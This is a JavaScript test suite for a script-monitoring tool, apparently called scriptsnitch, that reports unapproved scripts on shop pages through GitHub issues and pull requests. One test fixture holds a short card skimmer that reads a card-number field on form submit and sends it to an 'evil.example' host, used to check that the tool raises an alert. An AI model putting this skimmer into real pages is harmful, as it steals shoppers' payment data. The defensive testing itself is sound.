import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, readdirSync, existsSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { report } from '../../src/modes/report.js';
import { parseConfig } from '../../src/config/config.js';
import { parseApproved, emptyApproved, approvePending, serializeApproved, siteSection } from '../../src/config/approved.js';
import { readMarker } from '../../src/report/markers.js';
import { DRILL_ORIGIN } from '../../src/capture/drill.js';
import { createFakeGitHub } from '../helpers/fake-github.js';
import { writeZip } from '../helpers/zip-writer.js';
import { SITE, H, ext, inline, scriptRef, visit, snapshot } from '../helpers/snapshots.js';

const PATH = 'scriptsnitch/approved.json';
const T0 = Date.UTC(2026, 10, 24, 6);
const day = (n) => T0 + n * 86400000;
const INDEX = `${SITE}/assets/index-B7kQ0aRz.js`;
const CHUNK = `${SITE}/assets/chunk-Dq9Wn3Lp.js`;
const LIB = 'https://cdn.example/lib@1.2.3/lib.min.js';
const T1 = 'e'.repeat(64);
const APP_SOURCE = Array.from({ length: 30 }, (_, i) => `function part${i}(){return ${i}}`).join('\n');
const config = parseConfig(JSON.stringify({ notify: ['octocat'], profiles: ['desktop'], pages: [{ name: 'Home', url: `${SITE}/` }, { name: 'Checkout', url: `${SITE}/checkout`, sensitive: true }] }), 'config.json');

const dest = (url, by) => ({ url, method: 'GET', type: 'Fetch', frame: 'top', initiator: scriptRef(by), phase: 'load' });
const observed = ({ index = INDEX, chunks = [CHUNK], extra = [], listeners = [], indexHash } = {}) => ({
  scripts: [ext(index, indexHash ? { hash: indexHash } : {}), ...chunks.map((c) => ext(c, { creator: index, referenced: true })), ext(LIB), inline(T1), ...extra],
  destinations: [dest(`${SITE}/api/ping`, index)],
  listeners,
  headers: { 'strict-transport-security': 'max-age=31536000' },
});
const snap = (home = observed(), checkout = observed(), extraVisits = []) => snapshot([{ path: '/', observed: home }, { path: '/checkout', sensitive: true, ...(extraVisits.length ? { visits: [visit({ role: 'A', ...checkout }), visit({ role: 'B', ...checkout }), ...extraVisits] } : { observed: checkout }) }]);

function harness() {
  const dir = mkdtempSync(join(tmpdir(), 'scriptsnitch-report-'));
  return { dir, gh: createFakeGitHub({ permissions: { octocat: 'write' } }) };
}
async function doRun(h, n, s, { evidence = { [H(INDEX)]: APP_SOURCE }, failOn = 'never', dryRun = false, missing = false } = {}) {
  const dir = join(h.dir, `run${n}`);
  mkdirSync(join(dir, 'evidence'), { recursive: true });
  if (!missing) {
    for (const [hash, src] of Object.entries(evidence)) {
      writeFileSync(join(dir, 'evidence', `${hash}.js`), src);
      s.evidence[hash] = { file: `evidence/${hash}.js`, url: hash === H(INDEX) ? INDEX : null, bytes: src.length };
    }
    writeFileSync(join(dir, 'snapshot.json'), JSON.stringify(s));
  }
  const text = h.gh.file(PATH, 'main');
  const result = await report({
    snapshotPath: join(dir, 'snapshot.json'), outDir: dir, config, approved: text ? parseApproved(text, PATH) : emptyApproved(), approvedPath: PATH,
    github: h.gh, dryRun, propose: 'pr', failOn, workflowFile: 'scriptsnitch.yml', runId: 100 + n, runUrl: `https://github.com/acme/shop/actions/runs/${100 + n}`, repoUrl: 'https://github.com/acme/shop',
    now: day(n), resolve: async () => ['192.0.2.1'], fetchImpl: async () => new Response('{}', { status: 404 }), summaryPath: join(dir, 'summary.md'),
  });
  if (!missing && !dryRun) {
    const files = readdirSync(join(dir, 'evidence')).map((f) => ({ name: `evidence/${f}`, data: readFileSync(join(dir, 'evidence', f)) }));
    h.gh.state.runs.push({ id: 100 + n, workflowFile: 'scriptsnitch.yml', status: 'completed', conclusion: 'success' });
    h.gh.state.artifacts[100 + n] = [{ id: 1000 + n, name: 'scriptsnitch', expired: false }];
    h.gh.state.blobs[1000 + n] = writeZip([{ name: 'snapshot.json', data: JSON.stringify(s) }, ...files]);
  }
  return result;
}
const siteIssues = (gh) => gh.state.issues.filter((i) => readMarker(i.body, 'site'));
const statusIssue = (gh) => gh.state.issues.find((i) => readMarker(i.body, 'status'));
const openPulls = (gh) => gh.state.pulls.filter((p) => p.state === 'open');
// What a person does after the first run: merge the proposal, approve what is pending, write reasons.
function approveEverything(gh) {
  const pr = openPulls(gh)[0];
  gh.mergePull(pr.number);
  let approved = parseApproved(gh.file(PATH, 'main'), PATH);
  for (const p of siteSection(approved, SITE).pending) approved = approvePending(approved, SITE, p.finding, 'Reviewed by the team');
  gh.commitFile(PATH, serializeApproved(approved).replaceAll('TODO: why does this page need it?', 'Part of the shop'), { author: 'octocat' });
}
async function establish() {
  const h = harness();
  await doRun(h, 0, snap());
  approveEverything(h.gh);
  await doRun(h, 1, snap());
  return h;
}

test('first run opens an initial approval PR and an issue saying nothing is approved yet', async (t) => {
  const h = harness();
  t.after(() => rmSync(h.dir, { recursive: true, force: true }));
  const first = snap();
  const visitA = first.pages[0].profiles.desktop.visits[0];
  visitA.destinations = [...visitA.destinations, { ...dest('https://beacon.example/b', INDEX), initiator: null }];
  const r = await doRun(h, 0, first);
  const [issue] = siteIssues(h.gh);
  assert.match(issue.body, /Nothing is approved for this site yet/);
  assert.equal(openPulls(h.gh).length, 1);
  const proposed = parseApproved(h.gh.file(PATH, openPulls(h.gh)[0].head.ref), PATH).sites[SITE];
  assert.ok(proposed.scripts.some((e) => e.match === LIB && e.trust === 'exact'));
  assert.ok(proposed.scripts.some((e) => e.match === `${SITE}/assets/*-{token}.js` && e.trust === 'deploy'));
  assert.ok(proposed.destinations.some((d) => d.match === SITE));
  assert.deepEqual(Object.keys(proposed.headers), ['**']);
  assert.ok(proposed.destinations.some((d) => d.match === 'https://beacon.example'), 'a first run proposes a Medium it saw once, too');
  assert.ok(statusIssue(h.gh));
  assert.ok(existsSync(join(h.dir, 'run0', 'report.json')));
  assert.equal(r.exitCode, 0);
});

test('a clean second run after merging closes nothing it should not', async (t) => {
  const h = await establish();
  t.after(() => rmSync(h.dir, { recursive: true, force: true }));
  const [issue] = siteIssues(h.gh);
  assert.equal(siteIssues(h.gh).length, 1);
  assert.equal(issue.state, 'closed');
  assert.equal(openPulls(h.gh).length, 0);
  assert.equal(statusIssue(h.gh).state, 'open');
  assert.equal(readMarker(statusIssue(h.gh).body, 'status').run, 2);
});

const SKIMMER = `${APP_SOURCE}\ndocument.addEventListener('submit',function(){\nvar c=document.querySelector('input[name=cardnumber]').value;\nnew Image().src='https://cdn-analytics.evil.example/p.gif?c='+c;\n});`;
const skimmed = () => {
  const checkout = observed({ indexHash: H('skimmed'), extra: [ext('https://evil.example/x.js')], listeners: [{ kind: 'card', role: 'field', event: 'keydown', script: scriptRef('https://evil.example/x.js') }] });
  return snap(observed({ indexHash: H('skimmed') }), checkout);
};

test('a skimmer appears: High issue, pending proposal, diff in the issue', async (t) => {
  const h = await establish();
  t.after(() => rmSync(h.dir, { recursive: true, force: true }));
  const r = await doRun(h, 2, skimmed(), { evidence: { [H('skimmed')]: SKIMMER, [H(INDEX)]: APP_SOURCE } });
  const [issue] = siteIssues(h.gh);
  assert.equal(issue.state, 'open');
  assert.match(issue.title, /^🔴 /);
  assert.match(issue.body, /in-place-change/);
  assert.match(issue.body, /new-origin/);
  assert.match(issue.body, /```diff[\s\S]*cdn-analytics\.evil\.example[^\n]*◀ hostname/);
  assert.equal((h.gh.state.comments[issue.number] ?? []).length, 1, 'one comment for the new keys');
  const pr = openPulls(h.gh)[0];
  const pending = parseApproved(h.gh.file(PATH, pr.head.ref), PATH).sites[SITE].pending.map((p) => p.finding.split('|')[0]);
  assert.ok(pending.includes('new-origin') && pending.includes('in-place-change'));
  assert.equal(r.high >= 2, true);
});

test('a deploy with new chunks raises nothing, nor a lazily loaded chunk a day later', async (t) => {
  const h = await establish();
  t.after(() => rmSync(h.dir, { recursive: true, force: true }));
  const NEW_INDEX = `${SITE}/assets/index-C9xR1bTp.js`;
  const deployed = observed({ index: NEW_INDEX, chunks: [`${SITE}/assets/chunk-Hh7Jk2Lm.js`] });
  const r1 = await doRun(h, 2, snap(deployed, deployed));
  assert.deepEqual([r1.high, r1.medium], [0, 0]);
  const lazy = observed({ index: NEW_INDEX, chunks: [`${SITE}/assets/chunk-Hh7Jk2Lm.js`, `${SITE}/assets/chunk-Lz9Kp2Mn.js`] });
  const r2 = await doRun(h, 3, snap(lazy, lazy));
  assert.deepEqual([r2.high, r2.medium], [0, 0]);
  assert.equal(siteIssues(h.gh)[0].state, 'closed');
  assert.equal(openPulls(h.gh).length, 0);
});

test('a missing snapshot records the failure and changes nothing else', async (t) => {
  const h = await establish();
  t.after(() => rmSync(h.dir, { recursive: true, force: true }));
  const before = readMarker(statusIssue(h.gh).body, 'status');
  const calls = h.gh.calls.length;
  const r = await doRun(h, 2, null, { missing: true });
  assert.equal(r.exitCode, 3);
  assert.match(statusIssue(h.gh).body, /This run failed/);
  assert.deepEqual(readMarker(statusIssue(h.gh).body, 'status'), before);
  const writes = h.gh.calls.slice(calls).filter((c) => !/^(list|get|compare|download)/.test(c.name));
  assert.deepEqual(writes.map((c) => c.name), ['updateIssue']);
});

test('dry-run makes no writes', async (t) => {
  const h = harness();
  t.after(() => rmSync(h.dir, { recursive: true, force: true }));
  await doRun(h, 0, snap(), { dryRun: true });
  assert.deepEqual(h.gh.calls.filter((c) => !/^(list|get|compare|download)/.test(c.name)).map((c) => c.name), []);
  assert.ok(existsSync(join(h.dir, 'run0', 'report.json')));
  assert.match(readFileSync(join(h.dir, 'run0', 'summary.md'), 'utf8'), /scriptsnitch/);
});

test('fail-on high exits 1 with a High open', async (t) => {
  const h = await establish();
  t.after(() => rmSync(h.dir, { recursive: true, force: true }));
  assert.equal((await doRun(h, 2, skimmed(), { failOn: 'never', evidence: { [H('skimmed')]: SKIMMER } })).exitCode, 0);
  assert.equal((await doRun(h, 3, skimmed(), { failOn: 'high', evidence: { [H('skimmed')]: SKIMMER } })).exitCode, 1);
  assert.equal((await doRun(h, 4, snap(), { failOn: 'high' })).exitCode, 1, 'a vanished High still waits in the issue');
});

test('drill pass and fail reach only the status issue', async (t) => {
  const h = await establish();
  t.after(() => rmSync(h.dir, { recursive: true, force: true }));
  const skimmer = `${DRILL_ORIGIN}/s.js`;
  const drillVisit = (listeners) => visit({ role: 'drill', ...observed(), scripts: [...observed().scripts, ext(skimmer)], listeners, destinations: [{ url: `${DRILL_ORIGIN}/c?d=x`, method: 'GET', type: 'Image', frame: 'top', initiator: scriptRef(skimmer), phase: 'probe' }], probe: { values: { password: 'x' }, submitted: true, hits: [{ kind: 'card', encoding: 'raw', url: `${DRILL_ORIGIN}/c?d=x`, frame: 'top', initiator: scriptRef(skimmer) }], growth: [], storage: [] } });
  const passing = snap(observed(), observed(), [drillVisit([{ kind: 'card', role: 'field', event: 'keydown', script: scriptRef(skimmer) }])]);
  passing.run.drill = true;
  await doRun(h, 2, passing);
  const failing = snap(observed(), observed(), [drillVisit([])]);
  failing.run.drill = true;
  await doRun(h, 3, failing);
  const comments = (h.gh.state.comments[statusIssue(h.gh).number] ?? []).map((c) => c.body).join('\n');
  assert.match(comments, /Fire drill passed/);
  assert.match(comments, /Fire drill failed/);
  for (const issue of siteIssues(h.gh)) assert.ok(!issue.body.includes('drill.scriptsnitch.invalid'));
  assert.equal(openPulls(h.gh).length, 0);
});

test('stale approvals are proposed once a month at most', async (t) => {
  const h = await establish();
  t.after(() => rmSync(h.dir, { recursive: true, force: true }));
  const approved = parseApproved(h.gh.file(PATH, 'main'), PATH);
  approved.sites[SITE].scripts.push({ id: 'old-widget', match: 'https://old-widget.example/w.js', trust: 'origin', pages: ['**'], behavior: { hosts: [], listens: [], input: false, eval: false, obfuscation: 'minified' }, reason: 'A widget we stopped using', approved: '2026-09-01' });
  h.gh.commitFile(PATH, serializeApproved(approved), { author: 'octocat' });
  await doRun(h, 2, snap());
  const [pr] = openPulls(h.gh);
  assert.ok(pr, 'a pull request proposing the removal');
  assert.equal(parseApproved(h.gh.file(PATH, pr.head.ref), PATH).sites[SITE].scripts.some((e) => e.id === 'old-widget'), false);
  await h.gh.updatePull(pr.number, { state: 'closed' });
  await doRun(h, 7, snap());
  assert.equal(openPulls(h.gh).length, 0, 'not again within the month');
  await doRun(h, 33, snap());
  assert.equal(openPulls(h.gh).length, 1);
});

test('the CLI report command judges a snapshot with the GitHub state', async (t) => {
  const { runCli } = await import('../../src/cli.js');
  const h = harness();
  t.after(() => rmSync(h.dir, { recursive: true, force: true }));
  mkdirSync(join(h.dir, 'scriptsnitch'));
  mkdirSync(join(h.dir, 'scriptsnitch-out'));
  writeFileSync(join(h.dir, 'scriptsnitch', 'config.json'), JSON.stringify({ profiles: ['desktop'], pages: [{ name: 'Home', url: `${SITE}/` }] }));
  writeFileSync(join(h.dir, 'scriptsnitch-out', 'snapshot.json'), JSON.stringify(snapshot([{ path: '/', observed: observed() }])));
  const out = [];
  const opts = { stdout: { write: (s) => out.push(s) }, stderr: { write: (s) => out.push(s) }, env: { GITHUB_TOKEN: 'x' }, cwd: h.dir, githubFactory: () => h.gh };
  assert.equal(await runCli(['report', '--github', 'acme/shop', '--dry-run'], opts), 0, out.join(''));
  assert.deepEqual(h.gh.calls.filter((c) => !/^(list|get|compare|download)/.test(c.name)), []);
  assert.ok(existsSync(join(h.dir, 'scriptsnitch-out', 'report.json')));
  assert.equal(await runCli(['report', '--github', 'acme/shop'], opts), 0);
  assert.equal(siteIssues(h.gh).length, 1);
  assert.equal(await runCli(['report'], { ...opts, env: {} }), 3, 'report needs a repository and a token');
});
